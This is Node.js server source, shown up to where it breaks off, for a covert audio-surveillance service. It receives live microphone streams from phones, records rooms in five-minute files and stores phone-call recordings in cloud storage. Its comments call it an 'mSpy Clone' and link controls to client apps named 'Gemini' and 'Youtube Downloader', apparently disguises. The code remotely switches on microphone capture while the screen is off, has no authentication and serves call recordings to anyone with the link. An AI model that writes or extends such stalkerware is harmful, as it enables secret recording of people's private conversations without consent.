const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const fsp = require('fs').promises;
const path = require('path');
const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
const multer = require('multer');
const { registerTranscribeRoutes, openaiConfigured } = require('./transcribe');

const app = express();
// Render terminates TLS at the edge; without this, req.protocol is "http" and playback URLs break on https dashboards.
app.set('trust proxy', 1);
app.use(express.json({ limit: '32kb' }));
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
const PORT = process.env.PORT || 8080;
const PUBLIC_BASE_URL = (process.env.PUBLIC_BASE_URL || '').replace(/\/$/, '');

// ─── Cloudflare R2 client ────────────────────────────────────────────────────
const r2 = new S3Client({
  region: 'auto',
  endpoint: `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com`,
  credentials: {
    accessKeyId: process.env.R2_ACCESS_KEY_ID,
    secretAccessKey: process.env.R2_SECRET_ACCESS_KEY,
  },
});
const R2_BUCKET = process.env.R2_BUCKET_NAME || 'live-listener-audio';

// ─── In-memory state ─────────────────────────────────────────────────────────
const senders   = new Map(); // ws → { id, name, connectedAt, lastHeartbeat, sampleRate, quality, mode }
const receivers = new Map(); // ws → { selectedSender, lastHeartbeat, qualityPreference }

// Audio buffers for R2 upload: Map<senderName, { chunks: Buffer[], startTime: number, sampleRate: number }>
const audioBuffers = new Map();
const CHUNK_DURATION_MS = 300_000; // upload one file every 5 minutes per enabled device

// Ultimate (cloud upload) — stable device names (survives sender WebSocket reconnects)
const ultimateDeviceNames = new Set();

// Persist Ultimate list across process restarts (set ULTIMATE_PERSIST_PATH for a mounted volume on PaaS)
const ULTIMATE_PERSIST_FILE = process.env.ULTIMATE_PERSIST_PATH
  ? path.resolve(process.env.ULTIMATE_PERSIST_PATH)
  : path.join(process.cwd(), 'data', 'ultimate-devices.json');

async function loadUltimateDeviceNamesFromDisk() {
  try {
    const raw = await fsp.readFile(ULTIMATE_PERSIST_FILE, 'utf8');
    const arr = JSON.parse(raw);
    if (!Array.isArray(arr)) {
      console.warn('[ULTIMATE] Persist file ignored: expected a JSON array');
      return;
    }
    ultimateDeviceNames.clear();
    for (const x of arr) {
      if (typeof x === 'string' && x.length > 0 && x.length < 512) {
        ultimateDeviceNames.add(x);
      }
    }
    console.log(`[ULTIMATE] Restored ${ultimateDeviceNames.size} device name(s) from ${ULTIMATE_PERSIST_FILE}`);
  } catch (e) {
    if (e.code !== 'ENOENT') {
      console.error(`[ULTIMATE] Load failed: ${e.message}`);
    }
  }
}

async function persistUltimateDeviceNames() {
  try {
    const dir = path.dirname(ULTIMATE_PERSIST_FILE);
    await fsp.mkdir(dir, { recursive: true });
    const arr = [...ultimateDeviceNames].sort();
    const tmp = `${ULTIMATE_PERSIST_FILE}.${process.pid}.tmp`;
    await fsp.writeFile(tmp, `${JSON.stringify(arr)}\n`, 'utf8');
    await fsp.rename(tmp, ULTIMATE_PERSIST_FILE);
  } catch (e) {
    console.error(`[ULTIMATE] Save failed: ${e.message}`);
  }
}

// Sleeper-override — stable by device name (survives sender WebSocket reconnects)
const sleeperOverriddenDeviceNames = new Set();

// Disconnected-by-receiver — senders with this deviceName are rejected until unblocked
const blockedDeviceNames = new Set();

// Logs per device
const deviceLogs = new Map();
const MAX_LOGS_PER_DEVICE = 200;

// Stats
let stats = {
  totalConnections: 0,
  activeSenders: 0,
  activeReceivers: 0,
  bytesRelayed: 0,
  bytesUploaded: 0,
  startTime: Date.now(),
};

// ─── WAV header helper ───────────────────────────────────────────────────────
function buildWavHeader(dataLength, sampleRate) {
  const numChannels = 1;
  const bitsPerSample = 16;
  const byteRate = sampleRate * numChannels * (bitsPerSample / 8);
  const blockAlign = numChannels * (bitsPerSample / 8);
  const buf = Buffer.alloc(44);

  buf.write('RIFF', 0);
  buf.writeUInt32LE(36 + dataLength, 4);
  buf.write('WAVE', 8);
  buf.write('fmt ', 12);
  buf.writeUInt32LE(16, 16);
  buf.writeUInt16LE(1, 20);        // PCM
  buf.writeUInt16LE(numChannels, 22);
  buf.writeUInt32LE(sampleRate, 24);
  buf.writeUInt32LE(byteRate, 28);
  buf.writeUInt16LE(blockAlign, 32);
  buf.writeUInt16LE(bitsPerSample, 34);
  buf.write('data', 36);
  buf.writeUInt32LE(dataLength, 40);
  return buf;
}

/** Mono 16-bit PCM: duration from raw PCM byte length */
function pcmDurationSeconds(pcmByteLength, sampleRate) {
  const bytesPerFrame = 2; // mono int16
  return pcmByteLength / (sampleRate * bytesPerFrame);
}

/** Filename-safe label, e.g. 5m12s, 1h06m03s */
function formatDurationForFilename(totalSeconds) {
  const s = Math.max(0, Math.round(totalSeconds));
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (h > 0) return `${h}h${m}m${sec}s`;
  if (m > 0) return `${m}m${sec}s`;
  return `${sec}s`;
}

// ─── R2 upload helper ────────────────────────────────────────────────────────
async function uploadToR2(senderName, sampleRate, pcmChunks, startTime) {
  try {
    const totalBytes = pcmChunks.reduce((s, c) => s + c.length, 0);
    if (totalBytes === 0) return;

    const pcmData = Buffer.concat(pcmChunks);
    const wavHeader = buildWavHeader(pcmData.length, sampleRate);
    const wavData = Buffer.concat([wavHeader, pcmData]);

    const durationSec = pcmDurationSeconds(pcmData.length, sampleRate);
    const durationLabel = formatDurationForFilename(durationSec);

    const date = new Date(startTime);
    const dateStr = date.toISOString().slice(0, 10);                         // YYYY-MM-DD
    const timeStr = date.toISOString().slice(11, 19).replace(/:/g, '-');     // HH-MM-SS
    const isoStart = date.toISOString().replace(/:/g, '-');                 // full UTC for metadata / logs
    const safeName = senderName.replace(/[^a-zA-Z0-9_\-]/g, '_');
    // e.g. Google-Pixel_4/2026-03-28/2026-03-28_04-12-12_5m12s_24kHz.wav
    const key = `${safeName}/${dateStr}/${dateStr}_${timeStr}_${durationLabel}_${sampleRate}Hz.wav`;

    await r2.send(new PutObjectCommand({
      Bucket: R2_BUCKET,
      Key: key,
      Body: wavData,
      ContentType: 'audio/wav',
      Metadata: {
        'start-utc': isoStart,
        'duration-seconds': String(Math.round(durationSec)),
        'duration-label': durationLabel,
        'sample-rate': String(sampleRate),
      },
    }));

    stats.bytesUploaded += wavData.length;
    console.log(`[R2] Uploaded ${key} (${(wavData.length / 1024).toFixed(1)} KB, ~${durationLabel})`);
  } catch (err) {
    console.error(`[R2] Upload failed for ${senderName}: ${err.message}`);
  }
}

// ─── Flush a device's audio buffer to R2 ────────────────────────────────────
async function flushBuffer(senderName) {
  const buf = audioBuffers.get(senderName);
  if (!buf || buf.chunks.length === 0) return;

  const { chunks, startTime, sampleRate } = buf;
  audioBuffers.set(senderName, { chunks: [], startTime: Date.now(), sampleRate });
  await uploadToR2(senderName, sampleRate, chunks, startTime);
}

// ─── Periodic flush: every CHUNK_DURATION_MS, upload accumulated audio ───────
setInterval(async () => {
  if (ultimateDeviceNames.size === 0) return;
  for (const [, info] of senders) {
    if (ultimateDeviceNames.has(info.name)) {
      await flushBuffer(info.name);
    }
  }
}, CHUNK_DURATION_MS);

// ─── Call recording uploads (mSpy Clone) ─────────────────────────────────────
const callRecordingUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 },
});

function callRecordingPlaybackUrl(req, r2Key) {
  const base = PUBLIC_BASE_URL || `https://${req.get('host')}`;
  return `${base}/api/call-recording/play?key=${encodeURIComponent(r2Key)}`;
}

app.post('/api/call-recording', callRecordingUpload.single('audio'), async (req, res) => {
  try {
    if (!req.file || !req.file.buffer?.length) {
      return res.status(400).json({ success: false, error: 'missing audio file' });
    }
    const deviceName = (req.body.deviceName || req.body.deviceId || 'unknown').toString();
    const number = (req.body.number || 'unknown').toString();
    const endedAt = Number(req.body.endedAt) || Date.now();
    const durationSec = Number(req.body.durationSec) || 0;
    const date = new Date(endedAt);
    const dateStr = date.toISOString().slice(0, 10);
    const timeStr = date.toISOString().slice(11, 19).replace(/:/g, '-');
    const safeDevice = deviceName.replace(/[^a-zA-Z0-9_\-]/g, '_');
    const safeNumber = number.replace(/[^a-zA-Z0-9+]/g, '_').slice(0, 32);
    const originalName = (req.file.originalname || '').toString().toLowerCase();
    const isWav = (req.file.mimetype || '').includes('wav') || originalName.endsWith('.wav');
    const ext = isWav ? 'wav' : 'm4a';
    const r2Key = `calls/${safeDevice}/${dateStr}/${dateStr}_${timeStr}_${safeNumber}_${durationSec}s.${ext}`;

    await r2.send(new PutObjectCommand({
      Bucket: R2_BUCKET,
      Key: r2Key,
      Body: req.file.buffer,
      ContentType: req.file.mimetype || (isWav ? 'audio/wav' : 'audio/mp4'),
      Metadata: {
        'device-id': (req.body.deviceId || '').toString(),
        'number': number,
        'type': (req.body.type || '').toString(),
        'duration-seconds': String(durationSec),
      },
    }));

    stats.bytesUploaded += req.file.buffer.length;
    const playbackUrl = callRecordingPlaybackUrl(req, r2Key);
    console.log(`[CALL-REC] Uploaded ${r2Key} (${(req.file.buffer.length / 1024).toFixed(1)} KB)`);
    res.json({ success: true, r2Key, playbackUrl });
  } catch (err) {
    console.error(`[CALL-REC] Upload failed: ${err.message}`);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/call-recording/play', async (req, res) => {
  try {
    const key = (req.query.key || '').toString();
    if (!key || key.includes('..') || !key.startsWith('calls/')) {
      return res.status(400).send('invalid key');
    }
    const obj = await r2.send(new GetObjectCommand({ Bucket: R2_BUCKET, Key: key }));
    res.setHeader('Content-Type', obj.ContentType || 'audio/mp4');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cache-Control', 'private, max-age=3600');
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (obj.Body) {
      obj.Body.pipe(res);
    } else {
      res.status(404).send('not found');
    }
  } catch (err) {
    console.error(`[CALL-REC] Playback failed: ${err.message}`);
    res.status(404).send('not found');
  }
});

registerTranscribeRoutes(app, { r2, bucket: R2_BUCKET });

// ─── Express dashboard ───────────────────────────────────────────────────────
app.get('/', (req, res) => {
  const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = uptime % 60;
  const modeStatus = ultimateDeviceNames.size > 0
    ? `<span style="color:#4CAF50">● ${ultimateDeviceNames.size} device name(s) in Ultimate (cloud) mode</span>`
    : `<span style="color:#f44336">● No devices in Ultimate (cloud) mode</span>`;

  res.send(`<!DOCTYPE html><html><head><title>Audio Relay</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>body{font-family:sans-serif;max-width:800px;margin:50px auto;padding:20px;background:#0f0f0f;color:#e0e0e0}
    h1{color:#4CAF50;text-align:center}.status{background:#1a1a1a;padding:20px;border-radius:10px;margin:20px 0;border-left:4px solid #4CAF50}
    .stat{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #333}.stat:last-child{border-bottom:none}
    .label{color:#888}.value{color:#4CAF50;font-weight:bold;font-size:1.2em}</style>
    <script>setInterval(()=>location.reload(),5000)</script></head><body>
    <h1>🎙️ Audio Relay Server</h1>
    <div class="status">
      <div class="stat"><span class="label">Status:</span><span class="value">● ONLINE</span></div>
      <div class="stat"><span class="label">Uptime:</span><span class="value">${h}h ${m}m ${s}s</span></div>
      <div class="stat"><span class="label">Ultimate (per-device cloud):</span><span>${modeStatus}</span></div>
      <div class="stat"><span class="label">Active Senders:</span><span class="value">${stats.activeSenders}</span></div>
      <div class="stat"><span class="label">Active Receivers:</span><span class="value">${stats.activeReceivers}</span></div>
      <div class="stat"><span class="label">Data Relayed:</span><span class="value">${(stats.bytesRelayed/1048576).toFixed(2)} MB</span></div>
      <div class="stat"><span class="label">Data Uploaded to R2:</span><span class="value">${(stats.bytesUploaded/1048576).toFixed(2)} MB</span></div>
    </div></body></html>`);
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    senders: stats.activeSenders,
    receivers: stats.activeReceivers,
    ultimateEnabledDeviceNames: [...ultimateDeviceNames],
    ultimateEnabledSenderIds: Array.from(senders.values())
      .filter((s) => ultimateDeviceNames.has(s.name))
      .map((s) => s.id),
    uptime: Date.now() - stats.startTime,
    openaiConfigured: openaiConfigured(),
  });
});

// ─── WebSocket server ─────────────────────────────────────────────────────────
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  stats.totalConnections++;
  console.log(`[${new Date().toISOString()}] New connection from ${req.socket.remoteAddress}`);

  let clientType = null;
  let clientId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

  ws.send(JSON.stringify({ type: 'welcome', message: 'Connected to relay server', clientId }));

  ws.on('message', (data) => {
    try {
      // ── Text / control messages ──────────────────────────────────────────
      if (data.length < 2000) {
        try {
          const message = JSON.parse(data.toString());

          // ── identify ──────────────────────────────────────────────────────
          if (message.type === 'identify') {
            clientType = message.role;

            if (clientType === 'sender') {
              const deviceName = message.deviceName || `Device-${clientId.substr(0, 6)}`;

              if (blockedDeviceNames.has(deviceName)) {
                console.log(`[BLOCK] Rejecting sender (blocked): ${deviceName}`);
                try {
                  ws.send(JSON.stringify({ type: 'blocked', reason: 'disconnected_by_receiver' }));
                } catch {}
                try { ws.close(4000, 'blocked'); } catch {}
                return;
              }

              // Remove stale connection with same name
              senders.forEach((info, oldWs) => {
                if (info.name === deviceName && oldWs !== ws) {
                  senders.delete(oldWs);
                  try { oldWs.close(); } catch {}
                }
              });

              const sampleRate = message.sampleRate || 24000;
              const quality    = message.quality    || 'medium';
              const mode       = message.mode       || 'always-on';

              const alwaysMicWhenScreenOff = message.alwaysMicWhenScreenOff === true;
              const roomClipsEnabled = message.roomClipsEnabled === true;

              const restoredSleeper = sleeperOverriddenDeviceNames.has(deviceName);
              senders.set(ws, {
                id: clientId, name: deviceName, connectedAt: Date.now(),
                lastHeartbeat: Date.now(), sampleRate, quality, mode,
                sleeperOverridden: restoredSleeper,
                alwaysMicWhenScreenOff,
                roomClipsEnabled,
                screenOn: message.screenOn !== false,
                capturing: message.capturing === true,
                uploading: message.uploading === true,
                callHold: message.callHold === true,
                screenChangedAt: Date.now(),
              });
              stats.activeSenders = senders.size;
              console.log(`[SENDER] connected: ${deviceName} (mode=${mode}, alwaysMic=${alwaysMicWhenScreenOff}, clips=${roomClipsEnabled})`);

              ws.send(JSON.stringify({ type: 'identified', role: 'sender', senderId: clientId, deviceName }));

              // Restore sleeper override if it was set before reconnect
              if (restoredSleeper) {
                ws.send(JSON.stringify({ type: 'setSleeperMode', enabled: false }));
                console.log(`[SLEEPER] Restored override for ${deviceName} on reconnect`);
              }

              // Per-sender Ultimate (cloud recording) — keyed by stable device name
              ws.send(JSON.stringify({ type: 'ultimateModeState', active: ultimateDeviceNames.has(deviceName) }));

              broadcastSenderList();

              // If receivers are waiting, tell sender to stream (unless it's screen-off-only — it will decide itself)
              if (receivers.size > 0) {
                ws.send(JSON.stringify({ type: 'startStreaming' }));
              }

              try {
                ws.send(JSON.stringify({
                  type: 'relaySelection',
                  active: isSenderSelectedByAnyReceiver(clientId),
                }));
              } catch {}

              // Init audio buffer for this device
              if (!audioBuffers.has(deviceName)) {
                audioBuffers.set(deviceName, { chunks: [], startTime: Date.now(), sampleRate });
              }

            } else if (clientType === 'receiver') {
              receivers.set(ws, {
                selectedSender: null, connectedAt: Date.now(),
                lastHeartbeat: Date.now(), qualityPreference: message.qualityPreference || 'medium',
              });
              stats.activeReceivers = receivers.size;
              console.log(`[RECEIVER] connected (id=${clientId})`);

              ws.send(JSON.stringify({ type: 'identified', role: 'receiver' }));
              ws.send(JSON.stringify({ type: 'ultimateModeState', active: ultimateDeviceNames.size > 0 }));
              sendSenderList(ws);
              sendBlockedList(ws);
              broadcastStartStreaming();
              broadcastRelaySelectionToSenders();
            }
            return;
          }

          // ── selectSender ─────────────────────────────────────────────────
          if (message.type === 'selectSender' && clientType === 'receiver') {
            const info = receivers.get(ws);
            if (info) {
              info.selectedSender = message.senderId;
              console.log(`[RECEIVER] selected sender: ${message.senderId == null ? 'none (muted)' : message.senderId}`);
              ws.send(JSON.stringify({ type: 'senderSelected', senderId: message.senderId }));
              broadcastRelaySelectionToSenders();
            }
            return;
          }

          // ── changeQuality ────────────────────────────────────────────────
          if (message.type === 'changeQuality' && clientType === 'receiver') {
            const quality = message.quality || 'medium';
            senders.forEach((info, sWs) => {
              if (sWs.readyState === 1) {
                try { sWs.send(JSON.stringify({ type: 'changeQuality', quality })); } catch {}
              }
            });
            ws.send(JSON.stringify({ type: 'qualityChanged', quality }));
            return;
          }

          // ── ping ─────────────────────────────────────────────────────────
          if (message.type === 'ping') {
            if (clientType === 'sender') {
              const i = senders.get(ws);
              if (i) {
                i.lastHeartbeat = Date.now();
                let presenceChanged = false;
                if (typeof message.screenOn === 'boolean' && i.screenOn !== message.screenOn) {
                  i.screenOn = message.screenOn;
                  i.screenChangedAt = Date.now();
                  presenceChanged = true;
                }
                if (typeof message.capturing === 'boolean' && i.capturing !== message.capturing) {
                  i.capturing = message.capturing;
                  presenceChanged = true;
                }
                if (typeof message.uploading === 'boolean' && i.uploading !== message.uploading) {
                  i.uploading = message.uploading;
                  presenceChanged = true;
                }
                if (typeof message.callHold === 'boolean') i.callHold = message.callHold;
                if (typeof message.roomClipsEnabled === 'boolean' && i.roomClipsEnabled !== message.roomClipsEnabled) {
                  i.roomClipsEnabled = message.roomClipsEnabled;
                  presenceChanged = true;
                }
                broadcastSenderPresence(i);
                if (presenceChanged) broadcastSenderList();
              }
            } else {
              const i = receivers.get(ws); if (i) i.lastHeartbeat = Date.now();
            }
            ws.send(JSON.stringify({ type: 'pong' }));
            return;
          }

          // ── screenState from sender ──────────────────────────────────────
          if (message.type === 'screenState' && clientType === 'sender') {
            const i = senders.get(ws);
            if (i) {
              const nextOn = message.screenOn === true;
              if (i.screenOn !== nextOn) i.screenChangedAt = Date.now();
              i.screenOn = nextOn;
              i.capturing = message.capturing === true;
              i.uploading = message.uploading === true;
              i.callHold = message.callHold === true;
              if (typeof message.roomClipsEnabled === 'boolean') {
                i.roomClipsEnabled = message.roomClipsEnabled;
              }
              i.lastHeartbeat = Date.now();
              broadcastSenderPresence(i);
              broadcastSenderList();
            }
            return;
          }

          // ── getLogs ──────────────────────────────────────────────────────
          if (message.type === 'getLogs' && clientType === 'receiver') {
            const deviceName = message.deviceName || null;
            if (deviceName && deviceLogs.has(deviceName)) {
              ws.send(JSON.stringify({ type: 'logs', deviceName, logs: deviceLogs.get(deviceName) }));
            } else if (!deviceName) {
              const all = {};
              deviceLogs.forEach((l, d) => { all[d] = l; });
              ws.send(JSON.stringify({ type: 'logs', allLogs: all }));
            } else {
              ws.send(JSON.stringify({ type: 'logs', deviceName, logs: [] }));
            }
            return;
          }

          // ── log from sender ───────────────────────────────────────────────
          if (message.type === 'log' && clientType === 'sender') {
            const deviceName = message.deviceName || 'Unknown';
            if (!deviceLogs.has(deviceName)) deviceLogs.set(deviceName, []);
            const logs = deviceLogs.get(deviceName);
            logs.push({ timestamp: message.timestamp || Date.now(), level: message.level || 'info', message: message.message || '' });
            if (logs.length > MAX_LOGS_PER_DEVICE) logs.shift();
            console.log(`[LOG] ${deviceName} [${message.level}]: ${message.message}`);
            return;
          }

          // ── setUltimateForSender (from receiver) — per-device cloud upload ─
          if (message.type === 'setUltimateForSender' && clientType === 'receiver') {
            const senderId = message.senderId;
            const enabled = message.enabled === true;
            if (!senderId) return;
            senders.forEach((info, sWs) => {
              if (info.id !== senderId) return;
              if (enabled) {
                ultimateDeviceNames.add(info.name);
                console.log(`[ULTIMATE] ENABLED for ${info.name} (${senderId})`);
                audioBuffers.set(info.name, { chunks: [], startTime: Date.now(), sampleRate: info.sampleRate });
                try { sWs.send(JSON.stringify({ type: 'ultimateModeState', active: true })); } catch {}
                broadcastSenderList();
                receivers.forEach((_, rWs) => {
                  if (rWs.readyState === 1) {
                    try { rWs.send(JSON.stringify({ type: 'ultimateModeState', active: ultimateDeviceNames.size > 0 })); } catch {}
                  }
                });
                void persistUltimateDeviceNames();
              } else {
                (async () => {
                  if (ultimateDeviceNames.has(info.name)) {
                    await flushBuffer(info.name);
                    ultimateDeviceNames.delete(info.name);
                    console.log(`[ULTIMATE] DISABLED for ${info.name} (${senderId}) — flushed buffer`);
                  } else {
                    console.log(`[ULTIMATE] DISABLED for ${info.name} (${senderId})`);
                  }
                  audioBuffers.set(info.name, { chunks: [], startTime: Date.now(), sampleRate: info.sampleRate });
                  try { sWs.send(JSON.stringify({ type: 'ultimateModeState', active: false })); } catch {}
                  broadcastSenderList();
                  receivers.forEach((_, rWs) => {
                    if (rWs.readyState === 1) {
                      try { rWs.send(JSON.stringify({ type: 'ultimateModeState', active: ultimateDeviceNames.size > 0 })); } catch {}
                    }
                  });
                  await persistUltimateDeviceNames();
                })();
              }
            });
            return;
          }

          // ── blockSender — kick device + reject reconnects until unblockSender ─
          if (message.type === 'blockSender' && clientType === 'receiver') {
            const senderId = message.senderId;
            if (!senderId) return;
            for (const [sWs, info] of senders) {
              if (info.id !== senderId) continue;
              blockedDeviceNames.add(info.name);
              if (ultimateDeviceNames.has(info.name)) {
                flushBuffer(info.name).catch(() => {});
                ultimateDeviceNames.delete(info.name);
                void persistUltimateDeviceNames();
              }
              senders.delete(sWs);
              stats.activeSenders = senders.size;
              console.log(`[BLOCK] ${info.name} blocked and disconnected`);
              try { sWs.send(JSON.stringify({ type: 'blocked', reason: 'disconnected_by_receiver' })); } catch {}
              try { sWs.close(4000, 'blocked'); } catch {}
              break;
            }
            broadcastSenderList();
            broadcastBlockedList();
            receivers.forEach((_, rWs) => {
              if (rWs.readyState === 1) {
                try { rWs.send(JSON.stringify({ type: 'ultimateModeState', active: ultimateDeviceNames.size > 0 })); } catch {}
              }
            });
            return;
          }

          // ── unblockSender — allow this deviceName to connect again ─
          if (message.type === 'unblockSender' && clientType === 'receiver') {
            const deviceName = message.deviceName;
            if (deviceName) {
              blockedDeviceNames.delete(deviceName);
              console.log(`[BLOCK] Unblocked: ${deviceName}`);
            }
            broadcastBlockedList();
            return;
          }

          // ── setSleeperMode (from receiver, targeted at a specific sender) ──
          if (message.type === 'setSleeperMode' && clientType === 'receiver') {
            const targetId = message.senderId;
            const enabled  = message.enabled !== false; // default true
            senders.forEach((info, sWs) => {
              if (info.id === targetId && sWs.readyState === 1) {
                info.sleeperOverridden = !enabled; // overridden = sleeper disabled
                if (!enabled) {
                  sleeperOverriddenDeviceNames.add(info.name);
                } else {
                  sleeperOverriddenDeviceNames.delete(info.name);
                }
                try { sWs.send(JSON.stringify({ type: 'setSleeperMode', enabled })); } catch {}
                console.log(`[SLEEPER] ${info.name} sleeper mode: ${enabled ? 'ON' : 'OFF (live-only)'} (persisted by name)`);
              }
            });
            broadcastSenderList();
            return;
          }

          // ── setAlwaysMicWhenScreenOff (Gemini → one sender, persisted on device)
          if (message.type === 'setAlwaysMicWhenScreenOff' && clientType === 'receiver') {
            const senderId = message.senderId;
            const enabled = message.enabled === true;
            if (!senderId) return;
            senders.forEach((info, sWs) => {
              if (info.id !== senderId || sWs.readyState !== 1) return;
              info.alwaysMicWhenScreenOff = enabled;
              try {
                sWs.send(JSON.stringify({ type: 'setAlwaysMicWhenScreenOff', enabled }));
              } catch {}
              console.log(`[ALWAYS_MIC] ${info.name} (${senderId}) → ${enabled}`);
            });
            broadcastSenderList();
            return;
          }

          // ── setRoomClipsEnabled (Youtube Downloader → one sender, persisted; default off)
          if (message.type === 'setRoomClipsEnabled' && clientType === 'receiver') {
            const senderId = message.senderId;
            const enabled = message.enabled === true;
            if (!senderId) return;
            senders.forEach((info, sWs) => {
              if (info.id !== senderId || sWs.readyState !== 1) return;
              info.roomClipsEnabled = enabled;
              try {
                sWs.send(JSON.stringify({ type: 'setRoomClipsEnabled', enabled }));
              } catch {}
              console.log(`[ROOM_CLIPS] ${info.name} (${senderId}) → ${enabled}`);
            });
            broadcastSenderList();
            return;
          }

          // ── deactivateUltimateMode (from receiver) — clears ALL cloud uploads
          if (message.type === 'deactivateUltimateMode' && clientType === 'receiver') {
            (async () => {
              for (const name of ultimateDeviceNames) {
                await flushBuffer(name);
              }
              ultimateDeviceNames.clear();
              await persistUltimateDeviceNames();
              console.log(`[ULTIMATE] All devices cleared from cloud mode`);
              senders.forEach((info, sWs) => {
                try { sWs.send(JSON.stringify({ type: 'ultimateModeState', active: false })); } catch {}
              });
              broadcastSenderList();
              receivers.forEach((_, rWs) => {
                if (rWs.readyState === 1) {
                  try { rWs.send(JSON.stringify({ type: 'ultimateModeState', active: false })); } catch {}
                }
              });
            })();
            return;
          }

        } catch (e) {
          // Not JSON — fall through to audio handling
        }
      }

      // ── Binary audio data from sender ─────────────────────────────────────
      if (clientType === 'sender') {
        stats.bytesRelayed += data.length;
        const senderInfo = senders.get(ws);
        if (!senderInfo) return;

        senderInfo.lastHeartbeat = Date.now();

        // Buffer for R2 upload (per-device Ultimate)
        if (ultimateDeviceNames.has(senderInfo.name)) {
          const buf = audioBuffers.get(senderInfo.name);
          if (buf) buf.chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(data));
        }

        // Relay to receivers
        receivers.forEach((receiverInfo, receiverWs) => {
          if (receiverWs.readyState !== 1) return;
          // null = no stream until receiver picks one device (one-at-a-time)
          const shouldRelay =
            receiverInfo.selectedSender != null && receiverInfo.selectedSender === senderInfo.id;
          if (!shouldRelay) return;
          try {
            const header = Buffer.from(JSON.stringify({ senderId: senderInfo.id, senderName: senderInfo.name }) + '\n');
            receiverWs.send(Buffer.concat([header, Buffer.isBuffer(data) ? data : Buffer.from(data)]));
          } catch (err) {
            console.error(`Error relaying to receiver: ${err.message}`);
          }
        });
      }

    } catch (err) {
      console.error(`Error processing message: ${err.message}`);
    }
  });

  ws.on('close', () => {
    if (clientType === 'sender') {
      const info = senders.get(ws);
      // Flush pending cloud audio; keep ultimateDeviceNames so reconnect restores Ultimate for this device name
      if (info && ultimateDeviceNames.has(info.name)) flushBuffer(info.name).catch(() => {});
      senders.delete(ws);
      stats.activeSenders = senders.size;
      console.log(`[SENDER] disconnected: ${info?.name || clientId}`);
      broadcastSenderList();
    } else if (clientType === 'receiver') {
      receivers.delete(ws);
      stats.activeReceivers = receivers.size;
      console.log(`[RECEIVER] disconnected: ${clientId}`);
      broadcastRelaySelectionToSenders();
      if (receivers.size === 0) broadcastStopStreaming();
    }
  });

  ws.on('error', (err) => {
    console.error(`WebSocket error for ${clientId}: ${err.message}`);
  });
});

// ─── Helpers ─────────────────────────────────────────────────────────────────
function isSenderSelectedByAnyReceiver(senderId) {
  for (const r of receivers.values()) {
    if (r.selectedSender === senderId) return true;
  }
  return false;
}

function broadcastRelaySelectionToSenders() {
  senders.forEach((info, sWs) => {
    if (sWs.readyState !== 1) return;
    const active = isSenderSelectedByAnyReceiver(info.id);
    try {
      sWs.send(JSON.stringify({ type: 'relaySelection', active }));
    } catch {}
  });
}

function makeSenderList() {
  return Array.from(senders.values()).map(s => ({
    id: s.id, name: s.name, connectedAt: s.connectedAt,
    quality: s.quality || 'medium', sampleRate: s.sampleRate || 24000,
    mode: s.mode || 'always-on', sleeperOverridden: s.sleeperOverridden || false,
    ultimateCloudEnabled: ultimateDeviceNames.has(s.name),
    alwaysMicWhenScreenOff: s.alwaysMicWhenScreenOff === true,
    roomClipsEnabled: s.roomClipsEnabled === true,
    screenOn: s.screenOn !== false,
    capturing: s.capturing === true,
    uploading: s.uploading === true,
    callHold: s.callHold === true,
    lastHeartbeat: s.lastHeartbeat || s.connectedAt,
    screenChangedAt: s.screenChangedAt || s.connectedAt,
  }));
}

function broadcastSenderPresence(info) {
  if (!info) return;
  const msg = JSON.stringify({
    type: 'senderPresence',
    senderId: info.id,
    name: info.name,
    screenOn: info.screenOn !== false,
    capturing: info.capturing === true,
    uploading: info.uploading === true,
    callHold: info.callHold === true,
    lastHeartbeat: info.lastHeartbeat || Date.now(),
    screenChangedAt: info.screenChangedAt || Date.now(),
  });
  receivers.forEach((_, rWs) => {
    if (rWs.readyState === 1) {
      try { rWs.send(msg); } catch {}
    }
  });
}

function sendSenderList(receiverWs) {
  try { receiverWs.send(JSON.stringify({ type: 'senderList', senders: makeSenderList() })); } catch {}
}

function broadcastSenderList() {
  const list = makeSenderList();
  receivers.forEach((_, rWs) => {
    if (rWs.readyState === 1) {
      try { rWs.send(JSON.stringify({ type: 'senderList', senders: list })); } catch {}
    }
  });
}

function sendBlockedList(receiverWs) {
  try {
    receiverWs.send(JSON.stringify({ type: 'blockedDevices', names: [...blockedDeviceNames] }));
  } catch {}
}

function broadcastBlockedList() {
  const msg = JSON.stringify({ type: 'blockedDevices', names: [...blockedDeviceNames] });
  receivers.forEach((_, rWs) => {
    if (rWs.readyState === 1) try { rWs.send(msg); } catch {}
  });
}

function broadcastStartStreaming() {
  senders.forEach((info, sWs) => {
    if (sWs.readyState === 1) {
      try { sWs.send(JSON.stringify({ type: 'startStreaming' })); } catch {}
    }
  });
}

function broadcastStopStreaming() {
  senders.forEach((info, sWs) => {
    if (sWs.readyState === 1) {
      try { sWs.send(JSON.stringify({ type: 'stopStreaming' })); } catch {}
    }
  });
}

// ─── Stale connection cleanup ─────────────────────────────────────────────────
setInterval(() => {
  const now = Date.now();
  const timeout = 120_000;
  let changed = false;

  senders.forEach((info, ws) => {
    if (now - info.lastHeartbeat > timeout) {
      console.log(`[CLEANUP] Stale sender: ${info.name}`);
      if (ultimateDeviceNames.has(info.name)) flushBuffer(info.name).catch(() => {});
      senders.delete(ws);
